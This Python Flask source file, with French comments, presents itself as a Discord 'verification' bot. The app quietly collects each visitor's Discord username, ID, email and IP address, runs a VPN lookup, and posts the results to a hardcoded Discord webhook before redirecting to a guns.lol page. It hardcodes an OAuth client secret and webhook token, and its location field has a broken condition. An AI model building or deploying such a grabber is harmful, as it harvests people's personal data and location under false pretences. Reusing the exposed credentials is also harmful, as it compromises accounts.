from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "G2Z-Hx8fSOv8d_DsROLk0k-CZdFBrbA5"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"

WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"  # ← METS TON WEBHOOK

def check_vpn(ip):
    """Vérifie si l'IP est un VPN/proxy via ipapi.co ou ipqualityscore"""
    try:
        # Option 1: ipapi.co (gratuit, 1000 req/jour)
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        data = resp.json()
        
        # Vérifie si c'est un VPN/proxy (selon les infos retournées)
        if data.get('proxy') or data.get('tor') or data.get('vpn'):
            return True, data
        
        # Option 2: tu peux aussi utiliser ipqualityscore (clé API requise)
        # resp = requests.get(f"https://ipqualityscore.com/api/json/ip/TON_API_KEY/{ip}")
        
        return False, data
    except:
        return False, {"error": "check failed"}

@app.route("/")
def home():
    return "Bot de vérification en ligne ✅"

@app.route("/callback")
def callback():
    # Récupère l'IP du visiteur (gère les proxies)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    code = request.args.get("code")
    if not code:
        return "❌ Aucun code reçu.", 400

    # Échange du code contre un token
    token_resp = requests.post(
        "https://discord.com/api/oauth2/token",
        data={
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    token_data = token_resp.json()
    access_token = token_data.get("access_token")

    if not access_token:
        return f"❌ Erreur token : {token_data}", 400

    # Récupère les infos utilisateur Discord
    user_resp = requests.get(
        "https://discord.com/api/users/@me",
        headers={"Authorization": f"Bearer {access_token}"},
    )
    user = user_resp.json()

    username = user.get("username")
    email = user.get("email")
    user_id = user.get("id")

    # Vérification VPN
    is_vpn, vpn_data = check_vpn(user_ip)
    vpn_status = "⚠️ VPN/PROXY DÉTECTÉ" if is_vpn else "✅ IP propre"

    # Envoi au webhook Discord
    webhook_data = {
        "embeds": [{
            "title": "📝 Nouvelle vérification Discord",
            "color": 0x57f287 if not is_vpn else 0xed4245,
            "fields": [
                {"name": "👤 Utilisateur", "value": f"{username} ({user_id})", "inline": False},
                {"name": "📧 Email", "value": email or "Non renseigné", "inline": True},
                {"name": "🌐 IP", "value": user_ip, "inline": True},
                {"name": "🛡️ Statut VPN", "value": vpn_status, "inline": False},
                {"name": "📍 Localisation (approx)", "value": vpn_data.get('city', '?') + ", " + vpn_data.get('country_name', '?') if not isinstance(vpn_data, dict) else "Non dispo", "inline": True}
            ],
            "footer": {"text": "Système de vérification"}
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=webhook_data)
    except:
        pass

    print(f"✅ {username} ({user_id}) — {email} — IP: {user_ip} — VPN: {is_vpn}")

    # Redirection vers guns.lol
    return redirect("https://guns.lol/8km3")
